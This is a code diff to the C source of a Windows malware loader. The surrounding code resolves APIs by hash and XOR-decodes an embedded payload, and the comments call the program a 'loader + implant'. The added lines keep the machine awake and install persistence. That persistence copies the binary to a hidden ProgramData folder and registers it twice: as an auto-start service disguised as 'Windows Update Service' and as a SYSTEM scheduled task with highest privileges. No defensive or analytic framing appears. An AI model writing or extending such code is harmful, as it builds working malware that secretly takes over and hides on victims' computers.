@@ -32,6 +32,7 @@ typedef DWORD(WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
 typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
 typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
 typedef void *(WINAPI *pMemcpy)(void *, const void *, size_t);
+typedef BOOL(WINAPI *pSetThreadExecutionState)(DWORD);
 
 static DWORD djb2(const BYTE *s, int wide) {
     DWORD hash = 5381;
@@ -137,8 +138,42 @@ __attribute__((noinline)) static void decode_payload(BYTE *buf, SIZE_T len) {
     for (SIZE_T i = 0; i < len; i++) buf[i] ^= (BYTE)PAYLOAD_XOR_KEY;
 }
 
+/* stay awake: ES_CONTINUOUS | ES_SYSTEM_REQUIRED so the display/system never
+ * sleep while the loader + implant are active. Best effort; ignored if the API
+ * can't be resolved. */
+static void stay_awake(void) {
+    PVOID k32 = module_by_hash(djb2_wstr(L"kernel32.dll"));
+    if (!k32) return;
+    pSetThreadExecutionState set_es =
+        (pSetThreadExecutionState)export_by_hash(k32, djb2_str("SetThreadExecutionState"));
+    if (set_es) set_es(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
+}
+
+/* self-persistence: copy the loader into a hidden ProgramData path and register
+ * two unattended auto-start paths (service + scheduled task, both SYSTEM) so the
+ * implant returns after reboot with no user logged in. Best effort. */
+static void persist_self(void) {
+    char self[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, self, sizeof(self))) return;
+    char dest[MAX_PATH];
+    snprintf(dest, sizeof(dest), "C:\\ProgramData\\FleetSvc\\svc.exe");
+    CreateDirectoryA("C:\\ProgramData\\FleetSvc", NULL);
+    if (!CopyFileA(self, dest, FALSE)) return;
+    SetFileAttributesA(dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    char cmd[1024];
+    snprintf(cmd, sizeof(cmd),
+             "sc.exe create FleetSvc binPath= \"%s\" start= auto >nul 2>&1 & "
+             "sc.exe description FleetSvc \"Windows Update Service\" >nul 2>&1 & "
+             "schtasks.exe /create /TN FleetTask /TR \"%s\" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >nul 2>&1",
+             dest, dest);
+    system(cmd);
+}
+
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show) {
     (void)hInst; (void)hPrev; (void)cmd; (void)show;
+
+    stay_awake();
+    persist_self();
 
     PVOID kernel32 = module_by_hash(djb2_wstr(L"kernel32.dll"));
     PVOID ntdll = module_by_hash(djb2_wstr(L"ntdll.dll"));
